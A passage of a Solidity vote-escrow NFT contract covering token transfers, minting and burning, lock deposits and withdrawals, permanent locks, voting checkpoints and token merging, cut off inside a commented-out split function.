ownership_change[_tokenId] = block.number;\r\n\r\n       \r\n        // Log the transfer\r\n        emit Transfer(_from, _to, _tokenId);\r\n    }\r\n\r\n    /// @dev Throws unless `msg.sender` is the current owner, an authorized operator, or the approved address for this NFT.\r\n    ///      Throws if `_from` is not the current owner.\r\n    ///      Throws if `_to` is the zero address.\r\n    ///      Throws if `_tokenId` is not a valid NFT.\r\n    /// @notice The caller is responsible to confirm that `_to` is capable of receiving NFTs or else\r\n    ///        they maybe be permanently lost.\r\n    /// @param _from The current owner of the NFT.\r\n    /// @param _to The new owner.\r\n    /// @param _tokenId The NFT to transfer.\r\n    function transferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint _tokenId\r\n    ) external {\r\n        _transferFrom(_from, _to, _tokenId, msg.sender);\r\n    }\r\n\r\n    /// @dev Transfers the ownership of an NFT from one address to another address.\r\n    ///      Throws unless `msg.sender` is the current owner, an authorized operator, or the\r\n    ///      approved address for this NFT.\r\n    ///      Throws if `_from` is not the current owner.\r\n    ///      Throws if `_to` is the zero address.\r\n    ///      Throws if `_tokenId` is not a valid NFT.\r\n    ///      If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\r\n    ///      the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint,bytes)\"))`.\r\n    /// @param _from The current owner of the NFT.\r\n    /// @param _to The new owner.\r\n    /// @param _tokenId The NFT to transfer.\r\n    function safeTransferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint _tokenId\r\n    ) external {\r\n        safeTransferFrom(_from, _to, _tokenId, \"\");\r\n    }\r\n\r\n    function _isContract(address account) internal view returns (bool) {\r\n        // This method relies on extcodesize, which returns 0 for contracts in\r\n        // construction, since the code is only stored at the end of the\r\n        // constructor execution.\r\n        uint size;\r\n        assembly {\r\n            size := extcodesize(account)\r\n        }\r\n        return size > 0;\r\n    }\r\n\r\n    /// @dev Transfers the ownership of an NFT from one address to another address.\r\n    ///      Throws unless `msg.sender` is the current owner, an authorized operator, or the\r\n    ///      approved address for this NFT.\r\n    ///      Throws if `_from` is not the current owner.\r\n    ///      Throws if `_to` is the zero address.\r\n    ///      Throws if `_tokenId` is not a valid NFT.\r\n    ///      If `_to` is a smart contract, it calls `onERC721Received` on `_to` and throws if\r\n    ///      the return value is not `bytes4(keccak256(\"onERC721Received(address,address,uint,bytes)\"))`.\r\n    /// @param _from The current owner of the NFT.\r\n    /// @param _to The new owner.\r\n    /// @param _tokenId The NFT to transfer.\r\n    /// @param _data Additional data with no specified format, sent in call to `_to`.\r\n    function safeTransferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint _tokenId,\r\n        bytes memory _data\r\n    ) public {\r\n        _transferFrom(_from, _to, _tokenId, msg.sender);\r\n\r\n        if (_isContract(_to)) {\r\n            // Throws if transfer destination is a contract which does not implement 'onERC721Received'\r\n            try IERC721Receiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data) returns (bytes4 response) {\r\n                if (response != IERC721Receiver(_to).onERC721Received.selector) {\r\n                    revert(\"E721_RJ\");\r\n                }\r\n            } catch (bytes memory reason) {\r\n                if (reason.length == 0) {\r\n                    revert('E721_NRCV');\r\n                } else {\r\n                    assembly {\r\n                        revert(add(32, reason), mload(reason))\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                              ERC165 LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /// @dev Interface identification is specified in ERC-165.\r\n    /// @param _interfaceID Id of the interface\r\n    function supportsInterface(bytes4 _interfaceID) external view returns (bool) {\r\n        return supportedInterfaces[_interfaceID];\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                        INTERNAL MINT/BURN LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /// @dev Mapping from owner address to mapping of index to tokenIds\r\n    mapping(address => mapping(uint => uint)) internal ownerToNFTokenIdList;\r\n\r\n    /// @dev Mapping from NFT ID to index of owner\r\n    mapping(uint => uint) internal tokenToOwnerIndex;\r\n\r\n    /// @dev  Get token by index\r\n    function tokenOfOwnerByIndex(address _owner, uint _tokenIndex) public view returns (uint) {\r\n        return ownerToNFTokenIdList[_owner][_tokenIndex];\r\n    }\r\n\r\n    /// @dev Add a NFT to an index mapping to a given addressndashushun\r\n    /// @param _to address of the receiver\r\n    /// @param _tokenId uint ID Of the token to be added\r\n    function _addTokenToOwnerList(address _to, uint _tokenId) internal {\r\n        uint current_count = _balance(_to);\r\n\r\n        ownerToNFTokenIdList[_to][current_count] = _tokenId;\r\n        tokenToOwnerIndex[_tokenId] = current_count;\r\n    }\r\n\r\n    /// @dev Add a NFT to a given address\r\n    ///      Throws if `_tokenId` is owned by someone.\r\n    function _addTokenTo(address _to, uint _tokenId) internal {\r\n        // Throws if `_tokenId` is owned by someone\r\n        assert(idToOwner[_tokenId] == address(0));\r\n        // Change the owner\r\n        idToOwner[_tokenId] = _to;\r\n        // Update owner token index tracking\r\n        _addTokenToOwnerList(_to, _tokenId);\r\n        // Change count tracking\r\n        ownerToNFTokenCount[_to] += 1;\r\n    }\r\n\r\n    /// @dev Function to mint tokens\r\n    ///      Throws if `_to` is zero address.\r\n    ///      Throws if `_tokenId` is owned by someone.\r\n    /// @param _to The address that will receive the minted tokens.\r\n    /// @param _tokenId The token id to mint.\r\n    /// @return A boolean that indicates if the operation was successful.\r\n    function _mint(address _to, uint _tokenId) internal returns (bool) {\r\n        // Throws if `_to` is zero address\r\n        assert(_to != address(0));\r\n        // checkpoint for gov\r\n        VotingDelegationLib.moveTokenDelegates(cpData, address(0), delegates(_to), _tokenId, ownerOf);\r\n        // Add NFT. Throws if `_tokenId` is owned by someone\r\n        _addTokenTo(_to, _tokenId);\r\n        emit Transfer(address(0), _to, _tokenId);\r\n        return true;\r\n    }\r\n\r\n    /// @dev Remove a NFT from an index mapping to a given address\r\n    /// @param _from address of the sender\r\n    /// @param _tokenId uint ID Of the token to be removed\r\n    function _removeTokenFromOwnerList(address _from, uint _tokenId) internal {\r\n        // Delete\r\n        uint current_count = _balance(_from) - 1;\r\n        uint current_index = tokenToOwnerIndex[_tokenId];\r\n\r\n        if (current_count == current_index) {\r\n            // update ownerToNFTokenIdList\r\n            ownerToNFTokenIdList[_from][current_count] = 0;\r\n            // update tokenToOwnerIndex\r\n            tokenToOwnerIndex[_tokenId] = 0;\r\n        } else {\r\n            uint lastTokenId = ownerToNFTokenIdList[_from][current_count];\r\n\r\n            // Add\r\n            // update ownerToNFTokenIdList\r\n            ownerToNFTokenIdList[_from][current_index] = lastTokenId;\r\n            // update tokenToOwnerIndex\r\n            tokenToOwnerIndex[lastTokenId] = current_index;\r\n\r\n            // Delete\r\n            // update ownerToNFTokenIdList\r\n            ownerToNFTokenIdList[_from][current_count] = 0;\r\n            // update tokenToOwnerIndex\r\n            tokenToOwnerIndex[_tokenId] = 0;\r\n        }\r\n    }\r\n\r\n    /// @dev Remove a NFT from a given address\r\n    ///      Throws if `_from` is not the current owner.\r\n    function _removeTokenFrom(address _from, uint _tokenId) internal {\r\n        // Throws if `_from` is not the current owner\r\n        assert(idToOwner[_tokenId] == _from);\r\n        // Change the owner\r\n        idToOwner[_tokenId] = address(0);\r\n        // Update owner token index tracking\r\n        _removeTokenFromOwnerList(_from, _tokenId);\r\n        // Change count tracking\r\n        ownerToNFTokenCount[_from] -= 1;\r\n    }\r\n\r\n    function _burn(uint _tokenId) internal {\r\n        require(_isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\r\n\r\n        address owner = ownerOf(_tokenId);\r\n\r\n        // Clear approval\r\n        delete idToApprovals[_tokenId];\r\n        // Remove token\r\n        //_removeTokenFrom(msg.sender, _tokenId);\r\n        _removeTokenFrom(owner, _tokenId);\r\n        // checkpoint for gov\r\n        VotingDelegationLib.moveTokenDelegates(cpData, delegates(owner), address(0), _tokenId, ownerOf);\r\n\r\n        emit Transfer(owner, address(0), _tokenId);\r\n    }\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                             ESCROW STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    mapping(uint => IVotingEscrow.LockedBalance) public locked;\r\n    uint public permanentLockBalance;\r\n    uint public epoch;\r\n    mapping(uint => int128) public slope_changes; // time -> signed slope change\r\n    uint public supply;\r\n    mapping(address => bool) public canSplit;\r\n\r\n\r\n    uint internal constant MULTIPLIER = 1 ether;\r\n\r\n    /*//////////////////////////////////////////////////////////////\r\n                              ESCROW LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /// @notice Get the most recently recorded rate of voting power decrease for `_tokenId`\r\n    /// @param _tokenId token of the NFT\r\n    /// @return Value of the slope\r\n    function get_last_user_slope(uint _tokenId) external view returns (int128) {\r\n        uint uepoch = votingBalanceLogicData.user_point_epoch[_tokenId];\r\n        return votingBalanceLogicData.user_point_history[_tokenId][uepoch].slope;\r\n    }\r\n\r\n    /// @notice Get the timestamp for checkpoint `_idx` for `_tokenId`\r\n    /// @param _tokenId token of the NFT\r\n    /// @param _idx User epoch number\r\n    /// @return Epoch time of the checkpoint\r\n    function user_point_history(uint _tokenId, uint _idx) external view returns (IVotingEscrow.Point memory) {\r\n        return votingBalanceLogicData.user_point_history[_tokenId][_idx];\r\n    }\r\n\r\n    function point_history(uint epoch) external view returns (IVotingEscrow.Point memory) {\r\n        return votingBalanceLogicData.point_history[epoch];\r\n    }\r\n\r\n    function user_point_epoch(uint tokenId) external view returns (uint) {\r\n        return votingBalanceLogicData.user_point_epoch[tokenId];\r\n    }\r\n\r\n    /// @notice Record global and per-user data to checkpoint\r\n    /// @param _tokenId NFT token ID. No user checkpoint if 0\r\n    /// @param old_locked Pevious locked amount / end lock time for the user\r\n    /// @param new_locked New locked amount / end lock time for the user\r\n    function _checkpoint(\r\n        uint _tokenId,\r\n        IVotingEscrow.LockedBalance memory old_locked,\r\n        IVotingEscrow.LockedBalance memory new_locked\r\n    ) internal {\r\n        IVotingEscrow.Point memory u_old;\r\n        IVotingEscrow.Point memory u_new;\r\n        int128 old_dslope = 0;\r\n        int128 new_dslope = 0;\r\n        uint _epoch = epoch;\r\n\r\n        if (_tokenId != 0) {\r\n            u_new.permanent = 0;\r\n\r\n            if(new_locked.isPermanent){\r\n                u_new.permanent = uint(int256(new_locked.amount));\r\n            }\r\n\r\n            // Calculate slopes and biases\r\n            // Kept at zero when they have to\r\n            if (old_locked.end > block.timestamp && old_locked.amount > 0) {\r\n                u_old.slope = old_locked.amount / iMAXTIME;\r\n                u_old.bias = u_old.slope * int128(int256(old_locked.end - block.timestamp));\r\n            }\r\n            if (new_locked.end > block.timestamp && new_locked.amount > 0) {\r\n                u_new.slope = new_locked.amount / iMAXTIME;\r\n                u_new.bias = u_new.slope * int128(int256(new_locked.end - block.timestamp));\r\n            }\r\n\r\n            // Read values of scheduled changes in the slope\r\n            // old_locked.end can be in the past and in the future\r\n            // new_locked.end can ONLY by in the FUTURE unless everything expired: than zeros\r\n            old_dslope = slope_changes[old_locked.end];\r\n            if (new_locked.end != 0) {\r\n                if (new_locked.end == old_locked.end) {\r\n                    new_dslope = old_dslope;\r\n                } else {\r\n                    new_dslope = slope_changes[new_locked.end];\r\n                }\r\n            }\r\n        }\r\n\r\n        IVotingEscrow.Point memory last_point = IVotingEscrow.Point({bias: 0, slope: 0, ts: block.timestamp, blk: block.number, permanent: 0});\r\n        if (_epoch > 0) {\r\n            last_point = votingBalanceLogicData.point_history[_epoch];\r\n        }\r\n        uint last_checkpoint = last_point.ts;\r\n        // initial_last_point is used for extrapolation to calculate block number\r\n        // (approximately, for *At methods) and save them\r\n        // as we cannot figure that out exactly from inside the contract\r\n        IVotingEscrow.Point memory initial_last_point = last_point;\r\n        uint block_slope = 0; // dblock/dt\r\n        if (block.timestamp > last_point.ts) {\r\n            block_slope = (MULTIPLIER * (block.number - last_point.blk)) / (block.timestamp - last_point.ts);\r\n        }\r\n        // If last point is already recorded in this block, slope=0\r\n        // But that's ok b/c we know the block in such case\r\n\r\n        // Go over weeks to fill history and calculate what the current point is\r\n        {\r\n            uint t_i = (last_checkpoint / WEEK) * WEEK;\r\n            for (uint i = 0; i < 255; ++i) {\r\n                // Hopefully it won't happen that this won't get used in 5 years!\r\n                // If it does, users will be able to withdraw but vote weight will be broken\r\n                t_i += WEEK;\r\n                int128 d_slope = 0;\r\n                if (t_i > block.timestamp) {\r\n                    t_i = block.timestamp;\r\n                } else {\r\n                    d_slope = slope_changes[t_i];\r\n                }\r\n                last_point.bias -= last_point.slope * int128(int256(t_i - last_checkpoint));\r\n                last_point.slope += d_slope;\r\n                if (last_point.bias < 0) {\r\n                    // This can happen\r\n                    last_point.bias = 0;\r\n                }\r\n                if (last_point.slope < 0) {\r\n                    // This cannot happen - just in case\r\n                    last_point.slope = 0;\r\n                }\r\n                last_checkpoint = t_i;\r\n                last_point.ts = t_i;\r\n                last_point.blk = initial_last_point.blk + (block_slope * (t_i - initial_last_point.ts)) / MULTIPLIER;\r\n                _epoch += 1;\r\n                if (t_i == block.timestamp) {\r\n                    last_point.blk = block.number;\r\n                    break;\r\n                } else {\r\n                    votingBalanceLogicData.point_history[_epoch] = last_point;\r\n                }\r\n            }\r\n        }\r\n\r\n        epoch = _epoch;\r\n        // Now point_history is filled until t=now\r\n\r\n        if (_tokenId != 0) {\r\n            // If last point was in this block, the slope change has been applied already\r\n            // But in such case we have 0 slope(s)\r\n            last_point.slope += (u_new.slope - u_old.slope);\r\n            last_point.bias += (u_new.bias - u_old.bias);\r\n            if (last_point.slope < 0) {\r\n                last_point.slope = 0;\r\n            }\r\n            if (last_point.bias < 0) {\r\n                last_point.bias = 0;\r\n            }\r\n            last_point.permanent = permanentLockBalance;\r\n        }\r\n\r\n        // Record the changed point into history\r\n        votingBalanceLogicData.point_history[_epoch] = last_point;\r\n\r\n        if (_tokenId != 0) {\r\n            // Schedule the slope changes (slope is going down)\r\n            // We subtract new_user_slope from [new_locked.end]\r\n            // and add old_user_slope to [old_locked.end]\r\n            if (old_locked.end > block.timestamp) {\r\n                // old_dslope was <something> - u_old.slope, so we cancel that\r\n                old_dslope += u_old.slope;\r\n                if (new_locked.end == old_locked.end) {\r\n                    old_dslope -= u_new.slope; // It was a new deposit, not extension\r\n                }\r\n                slope_changes[old_locked.end] = old_dslope;\r\n            }\r\n\r\n            if (new_locked.end > block.timestamp) {\r\n                if (new_locked.end > old_locked.end) {\r\n                    new_dslope -= u_new.slope; // old slope disappeared at this point\r\n                    slope_changes[new_locked.end] = new_dslope;\r\n                }\r\n                // else: we recorded it already in old_dslope\r\n            }\r\n            // Now handle user history\r\n            uint user_epoch = votingBalanceLogicData.user_point_epoch[_tokenId] + 1;\r\n\r\n            votingBalanceLogicData.user_point_epoch[_tokenId] = user_epoch;\r\n            u_new.ts = block.timestamp;\r\n            u_new.blk = block.number;\r\n            votingBalanceLogicData.user_point_history[_tokenId][user_epoch] = u_new;\r\n        }\r\n    }\r\n\r\n    /// @notice Deposit and lock tokens for a user\r\n    /// @param _tokenId NFT that holds lock\r\n    /// @param _value Amount to deposit\r\n    /// @param unlock_time New time when to unlock the tokens, or 0 if unchanged\r\n    /// @param locked_balance Previous locked amount / timestamp\r\n    /// @param deposit_type The type of deposit\r\n    function _deposit_for(\r\n        uint _tokenId,\r\n        uint _value,\r\n        uint unlock_time,\r\n        IVotingEscrow.LockedBalance memory locked_balance,\r\n        DepositType deposit_type\r\n    ) internal {\r\n        IVotingEscrow.LockedBalance memory _locked = locked_balance;\r\n        uint supply_before = supply;\r\n\r\n        supply = supply_before + _value;\r\n        IVotingEscrow.LockedBalance memory old_locked;\r\n        (old_locked.amount, old_locked.end, old_locked.isPermanent) = (_locked.amount, _locked.end, _locked.isPermanent);\r\n        // Adding to existing lock, or if a lock is expired - creating a new one\r\n        _locked.amount += int128(int256(_value));\r\n           \r\n        if (unlock_time != 0) {\r\n            _locked.end = unlock_time;\r\n        }\r\n        locked[_tokenId] = _locked;\r\n\r\n        // Possibilities:\r\n        // Both old_locked.end could be current or expired (>/< block.timestamp)\r\n        // value == 0 (extend lock) or value > 0 (add to lock or extend lock)\r\n        // _locked.end > block.timestamp (always)\r\n        _checkpoint(_tokenId, old_locked, _locked);\r\n\r\n        address from = msg.sender;\r\n        if (_value != 0) {\r\n            assert(IERC20(token).transferFrom(from, address(this), _value));\r\n        }\r\n\r\n        emit Deposit(from, _tokenId, _value, _locked.end, deposit_type, block.timestamp);\r\n        emit Supply(supply_before, supply_before + _value);\r\n    }\r\n\r\n    /// @notice Record global data to checkpoint\r\n    function checkpoint() external {\r\n        _checkpoint(0, IVotingEscrow.LockedBalance(0, 0, false), IVotingEscrow.LockedBalance(0, 0, false));\r\n    }\r\n\r\n    /// @notice Deposit `_value` tokens for `_tokenId` and add to the lock\r\n    /// @dev Anyone (even a smart contract) can deposit for someone else, but\r\n    ///      cannot extend their locktime and deposit for a brand new user\r\n    /// @param _tokenId lock NFT\r\n    /// @param _value Amount to add to user's lock\r\n    function deposit_for(uint _tokenId, uint _value) external nonreentrant {\r\n        IVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\r\n\r\n        require(_value > 0, \"ZV\"); // dev: need non-zero value\r\n        require(_locked.amount > 0, 'ZL');\r\n        require(_locked.end > block.timestamp || _locked.isPermanent, 'EXP');\r\n\r\n        if (_locked.isPermanent) permanentLockBalance += _value;\r\n\r\n        _deposit_for(_tokenId, _value, 0, _locked, DepositType.DEPOSIT_FOR_TYPE);\r\n            \r\n        if(voted[_tokenId]) {\r\n            IVoter(voter).poke(_tokenId);\r\n        }\r\n    }\r\n\r\n    /// @notice Deposit `_value` tokens for `_to` and lock for `_lock_duration`\r\n    /// @param _value Amount to deposit\r\n    /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\r\n    /// @param _to Address to deposit\r\n    function _create_lock(uint _value, uint _lock_duration, address _to) internal returns (uint) {\r\n        uint unlock_time = (block.timestamp + _lock_duration) / WEEK * WEEK; // Locktime is rounded down to weeks\r\n\r\n        require(_value > 0, \"ZV\"); // dev: need non-zero value\r\n        require(unlock_time > block.timestamp && (unlock_time <= block.timestamp + MAXTIME), 'IUT');\r\n\r\n        ++tokenId;\r\n        uint _tokenId = tokenId;\r\n        _mint(_to, _tokenId);\r\n\r\n        IVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\r\n\r\n        _deposit_for(_tokenId, _value, unlock_time, _locked, DepositType.CREATE_LOCK_TYPE);\r\n        return _tokenId;\r\n    }\r\n\r\n    /// @notice Deposit `_value` tokens for `msg.sender` and lock for `_lock_duration`\r\n    /// @param _value Amount to deposit\r\n    /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\r\n    function create_lock(uint _value, uint _lock_duration) external nonreentrant returns (uint) {\r\n        return _create_lock(_value, _lock_duration, msg.sender);\r\n    }\r\n\r\n    /// @notice Deposit `_value` tokens for `_to` and lock for `_lock_duration`\r\n    /// @param _value Amount to deposit\r\n    /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\r\n    /// @param _to Address to deposit\r\n    function create_lock_for(uint _value, uint _lock_duration, address _to) external nonreentrant returns (uint) {\r\n        return _create_lock(_value, _lock_duration, _to);\r\n    }\r\n\r\n    /// @notice Deposit `_value` additional tokens for `_tokenId` without modifying the unlock time\r\n    /// @param _value Amount of tokens to deposit and add to the lock\r\n    function increase_amount(uint _tokenId, uint _value) external nonreentrant {\r\n        assert(_isApprovedOrOwner(msg.sender, _tokenId));\r\n\r\n        IVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\r\n\r\n        assert(_value > 0); // dev: need non-zero value\r\n        require(_locked.amount > 0, 'ZL');\r\n        require(_locked.end > block.timestamp || _locked.isPermanent, 'EXP');\r\n        \r\n        if (_locked.isPermanent) permanentLockBalance += _value;\r\n        _deposit_for(_tokenId, _value, 0, _locked, DepositType.INCREASE_LOCK_AMOUNT);\r\n\r\n        // poke for the gained voting power \r\n        if(voted[_tokenId]) {\r\n            IVoter(voter).poke(_tokenId);\r\n        }\r\n        emit MetadataUpdate(_tokenId);\r\n    }\r\n\r\n    /// @notice Extend the unlock time for `_tokenId`\r\n    /// @param _lock_duration New number of seconds until tokens unlock\r\n    function increase_unlock_time(uint _tokenId, uint _lock_duration) external nonreentrant {\r\n        assert(_isApprovedOrOwner(msg.sender, _tokenId));\r\n\r\n        IVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\r\n        require(!_locked.isPermanent, \"!NORM\");\r\n        uint unlock_time = (block.timestamp + _lock_duration) / WEEK * WEEK; // Locktime is rounded down to weeks\r\n\r\n        require(_locked.end > block.timestamp && _locked.amount > 0, 'EXP||ZV');\r\n        require(unlock_time > _locked.end && (unlock_time <= block.timestamp + MAXTIME), 'IUT'); // IUT -> invalid unlock time\r\n\r\n        _deposit_for(_tokenId, 0, unlock_time, _locked, DepositType.INCREASE_UNLOCK_TIME);\r\n\r\n        // poke for the gained voting power \r\n        if(voted[_tokenId]) {\r\n            IVoter(voter).poke(_tokenId);\r\n        }\r\n        emit MetadataUpdate(_tokenId);\r\n    }\r\n\r\n\r\n    /// @notice Withdraw all tokens for `_tokenId`\r\n    /// @dev Only possible if the lock has expired\r\n    function withdraw(uint _tokenId) external nonreentrant {\r\n        assert(_isApprovedOrOwner(msg.sender, _tokenId));\r\n        require(attachments[_tokenId] == 0 && !voted[_tokenId], \"ATT\");\r\n\r\n        IVotingEscrow.LockedBalance memory _locked = locked[_tokenId];\r\n        require(!_locked.isPermanent, \"!NORM\");\r\n        require(block.timestamp >= _locked.end, \"!EXP\");\r\n        uint value = uint(int256(_locked.amount));\r\n\r\n        locked[_tokenId] = IVotingEscrow.LockedBalance(0, 0, false);\r\n        uint supply_before = supply;\r\n        supply = supply_before - value;\r\n\r\n        // old_locked can have either expired <= timestamp or zero end\r\n        // _locked has only 0 end\r\n        // Both can have >= 0 amount\r\n        _checkpoint(_tokenId, _locked, IVotingEscrow.LockedBalance(0, 0, false));\r\n\r\n        assert(IERC20(token).transfer(msg.sender, value));\r\n\r\n        // Burn the NFT\r\n        _burn(_tokenId);\r\n\r\n        emit Withdraw(msg.sender, _tokenId, value, block.timestamp);\r\n        emit Supply(supply_before, supply_before - value);\r\n    }\r\n\r\n    function lockPermanent(uint _tokenId) external {\r\n        address sender = msg.sender;\r\n        require(_isApprovedOrOwner(sender, _tokenId), \"NAO\");\r\n        \r\n        IVotingEscrow.LockedBalance memory _newLocked = locked[_tokenId];\r\n        require(!_newLocked.isPermanent, \"!NORM\");\r\n        require(_newLocked.end > block.timestamp, \"EXP\");\r\n        require(_newLocked.amount > 0, \"ZV\");\r\n\r\n        uint _amount = uint(int256(_newLocked.amount));\r\n        permanentLockBalance += _amount;\r\n        _newLocked.end = 0;\r\n        _newLocked.isPermanent = true;\r\n        _checkpoint(_tokenId, locked[_tokenId], _newLocked);\r\n        locked[_tokenId] = _newLocked;\r\n        if(voted[_tokenId]) {\r\n            IVoter(voter).poke(_tokenId);\r\n        }\r\n        emit LockPermanent(sender, _tokenId, _amount, block.timestamp);\r\n        emit MetadataUpdate(_tokenId);\r\n    }\r\n\r\n    function unlockPermanent(uint _tokenId) external {\r\n        address sender = msg.sender;\r\n        require(_isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\r\n\r\n        require(attachments[_tokenId] == 0 && !voted[_tokenId], \"ATT\");\r\n        IVotingEscrow.LockedBalance memory _newLocked = locked[_tokenId];\r\n        require(_newLocked.isPermanent, \"!NORM\");\r\n        uint _amount = uint(int256(_newLocked.amount));\r\n        permanentLockBalance -= _amount;\r\n        _newLocked.end = ((block.timestamp + MAXTIME) / WEEK) * WEEK;\r\n        _newLocked.isPermanent = false;\r\n\r\n        _checkpoint(_tokenId, locked[_tokenId], _newLocked);\r\n        locked[_tokenId] = _newLocked;\r\n\r\n        emit UnlockPermanent(sender, _tokenId, _amount, block.timestamp);\r\n        emit MetadataUpdate(_tokenId);\r\n    }\r\n\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                           GAUGE VOTING STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    // The following ERC20/minime-compatible methods are not real balanceOf and supply!\r\n    // They measure the weights for the purpose of voting, so they don't represent\r\n    // real coins.\r\n\r\n    function balanceOfNFT(uint _tokenId) external view returns (uint) {\r\n        if (ownership_change[_tokenId] == block.number) return 0;\r\n        return VotingBalanceLogic.balanceOfNFT(_tokenId, block.timestamp, votingBalanceLogicData);\r\n    }\r\n\r\n    function balanceOfNFTAt(uint _tokenId, uint _t) external view returns (uint) {\r\n        return VotingBalanceLogic.balanceOfNFT(_tokenId, _t, votingBalanceLogicData);\r\n    }\r\n\r\n    function balanceOfAtNFT(uint _tokenId, uint _block) external view returns (uint) {\r\n        return VotingBalanceLogic.balanceOfAtNFT(_tokenId, _block, votingBalanceLogicData, epoch);\r\n    }\r\n\r\n    /// @notice Calculate total voting power at some point in the past\r\n    /// @param _block Block to calculate the total voting power at\r\n    /// @return Total voting power at `_block`\r\n    function totalSupplyAt(uint _block) external view returns (uint) {\r\n        return VotingBalanceLogic.totalSupplyAt(_block, epoch, votingBalanceLogicData, slope_changes);\r\n    }\r\n\r\n    function totalSupply() external view returns (uint) {\r\n        return totalSupplyAtT(block.timestamp);\r\n    }\r\n\r\n    /// @notice Calculate total voting power\r\n    /// @dev Adheres to the ERC20 `totalSupply` interface for Aragon compatibility\r\n    /// @return Total voting power\r\n    function totalSupplyAtT(uint t) public view returns (uint) {\r\n        return VotingBalanceLogic.totalSupplyAtT(t, epoch, slope_changes,  votingBalanceLogicData);\r\n    }\r\n\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                            GAUGE VOTING LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    mapping(uint => uint) public attachments;\r\n    mapping(uint => bool) public voted;\r\n\r\n    function setVoter(address _voter) external {\r\n        require(msg.sender == team);\r\n        voter = _voter;\r\n    }\r\n\r\n\r\n\r\n    function voting(uint _tokenId) external {\r\n        require(msg.sender == voter);\r\n        voted[_tokenId] = true;\r\n    }\r\n\r\n    function abstain(uint _tokenId) external {\r\n        require(msg.sender == voter, \"NA\");\r\n        voted[_tokenId] = false;\r\n    }\r\n\r\n    function attach(uint _tokenId) external {\r\n        require(msg.sender == voter, \"NA\");\r\n        attachments[_tokenId] = attachments[_tokenId] + 1;\r\n    }\r\n\r\n    function detach(uint _tokenId) external {\r\n        require(msg.sender == voter, \"NA\");\r\n        attachments[_tokenId] = attachments[_tokenId] - 1;\r\n    }\r\n\r\n    function merge(uint _from, uint _to) external nonreentrant notPartnerNFT(_from) {\r\n        require(attachments[_from] == 0 && !voted[_from], \"ATT\");\r\n        require(_from != _to, \"SAME\");\r\n        require(_isApprovedOrOwner(msg.sender, _from) && \r\n        _isApprovedOrOwner(msg.sender, _to), \"NAO\");\r\n\r\n        IVotingEscrow.LockedBalance memory _locked0 = locked[_from];\r\n        IVotingEscrow.LockedBalance memory _locked1 = locked[_to];\r\n        require(_locked1.end > block.timestamp ||  _locked1.isPermanent,\"EXP||PERM\");\r\n        require(_locked0.isPermanent ? _locked1.isPermanent : true, \"!MERGE\");\r\n        \r\n        uint value0 = uint(int256(_locked0.amount));\r\n        uint end = _locked0.end >= _locked1.end ? _locked0.end : _locked1.end;\r\n\r\n        locked[_from] = IVotingEscrow.LockedBalance(0, 0, false);\r\n        _checkpoint(_from, _locked0, IVotingEscrow.LockedBalance(0, 0, false));\r\n        _burn(_from);\r\n\r\n        IVotingEscrow.LockedBalance memory newLockedTo;\r\n        newLockedTo.isPermanent = _locked1.isPermanent;\r\n\r\n        if (newLockedTo.isPermanent){\r\n            newLockedTo.amount = _locked1.amount + _locked0.amount;\r\n            if (!_locked0.isPermanent) {  // Only add if source wasn't already permanent\r\n                permanentLockBalance += value0;\r\n            }\r\n        }else{\r\n            newLockedTo.amount = _locked1.amount + _locked0.amount;\r\n            newLockedTo.end = end;\r\n        }\r\n\r\n        //_checkpointDelegatee(_delegates[_to], value0, true);\r\n        _checkpoint(_to, _locked1, newLockedTo);\r\n        locked[_to] = newLockedTo;\r\n\r\n        if(voted[_to]) {\r\n            IVoter(voter).poke(_to);\r\n        }\r\n        emit Merge(\r\n            msg.sender,\r\n            _from,\r\n            _to,\r\n            uint(int256(_locked0.amount)),\r\n            uint(int256(_locked1.amount)),\r\n            uint(int256(newLockedTo.amount)),\r\n            newLockedTo.end,\r\n            block.timestamp\r\n        );\r\n        emit MetadataUpdate(_to);\r\n    }\r\n\r\n\r\n    // function split(\r\n    //     uint _from,\r\n    //     uint _amount\r\n    // ) external nonreentrant splitAllowed(_from) notPartnerNFT(_from) returns (uint256 _tokenId1, uint256 _tokenId2) {\r\n    //     address owner = idToOwner[_from];\r\n        \r\n\r\n    //     IVotingEscrow.LockedBalance memory newLocked = locked[_from];\r\n    //     require(newLocked.end > block.timestamp || newLocked.isPermanent, \"EXP\");\r\n        \r\n    //     int128 _splitAmount = int128(int256(_amount));\r\n        \r\n    //     require(_splitAmount != 0, \"ZV\");\r\n    //     require(newLocked.amount > _splitAmount, \"BIGVAL\");\r\n\r\n    //     locked[_from] = IVotingEscrow.LockedBalance(0, 0, false);\r\n    //     _checkpoint(_from, newLocked, IVotingEscrow.LockedBalance(0, 0, false));\r\n    //     _burn(_from);\r\n\r\n    //     newLocked.amount -= _splitAmount;\r\n    //     _tokenId1 = _createSplitNFT(owner, newLocked);\r\n\r\n    //     newLocked.amount = _splitAmount;\r\n    //     _tokenId2 = _createSplitNFT(owner, newLocked);\r\n\r\n    //     // emit Split(\r\n    //     //     _from,\r\n    //     //     _tokenId1,\r\n    //     //     _tokenId2,\r\n    //     //     